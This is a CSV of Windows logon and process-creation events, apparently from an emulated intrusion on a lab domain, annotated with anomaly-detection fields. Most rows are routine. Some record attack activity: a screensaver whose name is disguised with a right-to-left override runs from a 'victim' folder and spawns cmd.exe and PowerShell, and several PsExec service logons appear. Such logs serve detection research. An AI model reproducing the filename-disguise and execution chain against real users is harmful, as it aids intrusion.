ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,is_remote_logon,was_elevated,anomaly_score,detection_source,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds,pair_key,pair_frequency
,-,2020-05-02 03:19:27.116000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x0,0x4,0.0,0x3e7,-,-,SYSTEM,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\wininit.exe,SCRANTON$,2020-05-02 03:19:27.219000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x25c,2.0,0x828e,-,-,UMFD-0,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:19:27.221000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x2b0,2.0,0x834a,-,-,UMFD-1,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:19:28.255000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x2b0,2.0,0xdd9b,-,-,DWM-1,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:19:28.256000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x2b0,2.0,0xddb8,-,-,DWM-1,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:20:47.620000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x14dc,2.0,0x12106a,-,-,UMFD-2,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:20:47.894000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x14dc,2.0,0x121a19,-,-,DWM-2,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:20:47.895000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x14dc,2.0,0x121a62,-,-,DWM-2,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\svchost.exe,SCRANTON$,2020-05-02 03:20:49.428000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x594,10.0,0x1305dc,SCRANTON,172.18.39.2,pbeesly,,,,,True,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\svchost.exe,SCRANTON$,2020-05-02 03:20:49.429000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x594,10.0,0x13069a,SCRANTON,172.18.39.2,pbeesly,,,,,True,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:11:41.263000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x23f4,2.0,0x867797,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:11:41.264000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x23f4,2.0,0x867825,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:12:47.928000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x1720,2.0,0x86b56b,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:12:47.930000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x1720,2.0,0x86b59a,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:13:51.455000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x2074,2.0,0x86e324,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:13:51.457000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x2074,2.0,0x86e353,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:15:05.608000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x658,2.0,0x89174e,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:15:05.610000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x658,2.0,0x89177d,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
,SCRANTON$,2020-05-02 03:20:01.053000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s fhsvc,C:\Windows\System32\services.exe,0x1134,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:15.314000+00:00,14.261,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:01.053000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x3e4,,,SCRANTON$,,C:\windows\System32\svchost.exe -k NetworkService -p -s DoSvc,C:\Windows\System32\services.exe,0x113c,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:24:23.396000+00:00,262.343,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:01.054000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k NetSvcs -p -s NcaSvc,C:\Windows\System32\services.exe,0x1158,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:01.438000+00:00,0.384,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:02.097000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0x1348,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:07.532000+00:00,5.4350000000000005,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:08.003000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s BITS,C:\Windows\System32\services.exe,0x354,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:22:42.870000+00:00,154.86700000000005,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:21:16.344000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x3e4,,,SCRANTON$,,C:\windows\System32\svchost.exe -k NetworkService -p,C:\Windows\System32\services.exe,0x1f94,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:21:25.656000+00:00,9.312,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:21:18.639000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\System32\svchost.exe,0x1ec8,,,-1,proc_anomaly,C:\Windows\System32\smartscreen.exe,smartscreen.exe,svchost.exe,False,False,2020-05-02 03:26:20.344000+00:00,301.7050000000001,svchost.exe -> smartscreen.exe,1.0
,SCRANTON$,2020-05-02 03:18:29.127000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k appmodel -p -s camsvc,C:\Windows\System32\services.exe,0xa6c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:26.010000+00:00,56.883,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:18:33.236000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1058,,0x0,,,-,,"""LogonUI.exe"" /flags:0x4 /state0:0xa3cb8855 /state1:0x41c64e6d",C:\Windows\System32\winlogon.exe,0x1bec,,,-1,proc_anomaly,"""LogonUI.exe""",logonui.exe,winlogon.exe,False,False,2020-05-02 03:19:24.873000+00:00,51.637,winlogon.exe -> logonui.exe,1.0
,SCRANTON$,2020-05-02 03:18:34.330000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k wsappx -p -s AppXSvc,C:\Windows\System32\services.exe,0x14d4,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:26.016000+00:00,51.68600000000001,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:18:35.351000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x232c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:24.875000+00:00,49.523999999999994,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 02:55:57.748000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x1158,,0x0,,,-,,"""C:\ProgramData\victim\â€®cod.3aka3.scr"" /S",C:\Windows\explorer.exe,0x214c,,,-1,proc_anomaly,"""C:\ProgramData\victim\â€®cod.3aka3.scr""",â€®cod.3aka3.scr,explorer.exe,False,False,2020-05-02 03:01:28.677000+00:00,330.9290000000001,explorer.exe -> â€®cod.3aka3.scr,1.0
,SCRANTON$,2020-05-02 03:20:47.615000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x3e5,,,LOCAL SERVICE,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1474,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:22:19.541000+00:00,91.926,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:20:47.898000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s DsmSvc,C:\Windows\System32\services.exe,0xa14,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:21:33.258000+00:00,45.36,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:51.611000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k wsappx -p -s AppXSvc,C:\Windows\System32\services.exe,0x16a8,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:28:11.110000+00:00,439.499,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 03:00:15.426000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xf24,,,-1,proc_anomaly,powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:20:07.156000+00:00,1191.73,powershell.exe -> powershell.exe,5.0
,pbeesly,2020-05-02 03:00:15.426000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf24,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xed4,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:05:10.638000+00:00,295.2120000000001,powershell.exe -> conhost.exe,6.0
,NEWYORK$,2020-05-02 03:01:34.553000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15bc,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.631000+00:00,75.078,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:01:36.990000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,NEWYORK$,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15b8,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.630000+00:00,72.64,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:04:31.261000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",C:\Windows\System32\SearchIndexer.exe,0xd38,,,-1,proc_anomaly,"""C:\windows\system32\SearchProtocolHost.exe""",searchprotocolhost.exe,searchindexer.exe,False,False,2020-05-02 03:10:51.862000+00:00,380.601,searchindexer.exe -> searchprotocolhost.exe,4.0
,SCRANTON$,2020-05-02 03:04:31.265000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 ",C:\Windows\System32\SearchIndexer.exe,0x7b8,,,-1,proc_anomaly,"""C:\windows\system32\SearchFilterHost.exe""",searchfilterhost.exe,searchindexer.exe,False,False,2020-05-02 03:08:16.251000+00:00,224.986,searchindexer.exe -> searchfilterhost.exe,5.0
,pbeesly,2020-05-02 03:05:26.907000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xf0c,,,-1,proc_anomaly,powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:18:33.253000+00:00,786.346,powershell.exe -> powershell.exe,5.0
,pbeesly,2020-05-02 03:05:26.919000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1ecc,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,786.3380000000002,powershell.exe -> conhost.exe,6.0
,NASHUA$,2020-05-02 03:05:26.992000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca",C:\Windows\System32\svchost.exe,0x2108,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:06:27.362000+00:00,60.37000000000001,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:05:27.006000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x196c,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:06:57.600000+00:00,90.594,svchost.exe -> runtimebroker.exe,8.0
,NASHUA$,2020-05-02 03:05:28.244000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1c78,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.441000+00:00,125.197,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:05:28.351000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca",C:\Windows\System32\svchost.exe,0x2300,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:06:30.388000+00:00,62.037000000000006,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:05:29.459000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x2220,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:38.600000+00:00,189.141,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:05:29.642000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x528,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:06:59.642000+00:00,90.0,svchost.exe -> runtimebroker.exe,8.0
,NASHUA$,2020-05-02 02:59:35.461000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1338,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:38.945000+00:00,3.4840000000000004,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:01:44.374000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x204c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:11:44.304000+00:00,599.9300000000002,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:02:46.350000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x5a8,,0x0,,,-,,C:\windows\system32\ProvTool.exe /turn 5 /source LogonIdleTask,C:\Windows\System32\svchost.exe,0x16b0,,,-1,proc_anomaly,C:\windows\system32\ProvTool.exe,provtool.exe,svchost.exe,False,False,2020-05-02 03:20:37.291000+00:00,1070.941,svchost.exe -> provtool.exe,1.0
,SCRANTON$,2020-05-02 03:02:47.443000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s dmwappushservice,C:\Windows\System32\services.exe,0x1a64,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:48.516000+00:00,241.07299999999998,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:02:47.451000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x3e5,,,LOCAL SERVICE,,C:\windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s SmsRouter,C:\Windows\System32\services.exe,0x1bfc,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:47.742000+00:00,360.291,services.exe -> svchost.exe,24.0
,NEWYORK$,2020-05-02 03:03:19.186000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x17e4,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:09:20.723000+00:00,361.537,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:03:33.333000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0xcc0,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:36.411000+00:00,183.078,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:04:05.737000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x2268,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:05:36.251000+00:00,90.514,svchost.exe -> wmiprvse.exe,14.0
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c,C:\ProgramData\victim\â€®cod.3aka3.scr,0xc50,,,-1,proc_anomaly,\\?\C:\windows\system32\conhost.exe,conhost.exe,â€®cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002,â€®cod.3aka3.scr -> conhost.exe,2.0
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,"""C:\windows\system32\cmd.exe""",C:\ProgramData\victim\â€®cod.3aka3.scr,0xd98,,,-1,proc_anomaly,"""C:\windows\system32\cmd.exe""",cmd.exe,â€®cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002,â€®cod.3aka3.scr -> cmd.exe,2.0
,pbeesly,2020-05-02 02:57:17.048000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0xd98,,0x0,,,-,,powershell,C:\Windows\System32\cmd.exe,0x1ad4,,,-1,proc_anomaly,powershell,powershell,cmd.exe,False,False,2020-05-02 02:58:34.683000+00:00,77.635,cmd.exe -> powershell,3.0
